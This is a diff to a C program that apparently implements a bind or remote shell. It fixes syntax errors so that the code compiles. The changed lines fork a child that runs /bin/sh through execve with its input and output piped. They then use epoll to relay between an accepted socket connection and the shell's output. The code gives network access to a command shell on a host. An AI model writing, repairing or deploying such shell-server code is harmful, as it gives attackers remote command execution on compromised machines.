@@ -47,7 +47,7 @@
 void main(int argc, char *argv[])
 {
     struct sockaddr_in sa;
-    int                i, r, evt, pid, fd, h[2];
+    int                i, r, s, len, efd, evt, pid, fd, h[2], in[2], out[2];
     char               buf[BUFSIZ];
     struct epoll_event evts[1];
 
@@ -73,7 +73,7 @@ void main(int argc, char *argv[])
       close(out[0]);
       close(out[1]);
       
-      execve, "/bin/sh", NULL, NULL);
+      execve("/bin/sh", 0, 0);
     } else {      
       close(in[0]); // close read end
       close(out[1]); // close write end
@@ -94,7 +94,7 @@ void main(int argc, char *argv[])
         r = accept(s, 0, 0);
       #endif
       
-      if ((efd = epoll_create1, 0)) > 0)
+      if ((efd = epoll_create1(0)) > 0)
       {
         h[0] = s;      // assign socket to peer
         h[1] = out[0]; // assign read end for stdout/stderr
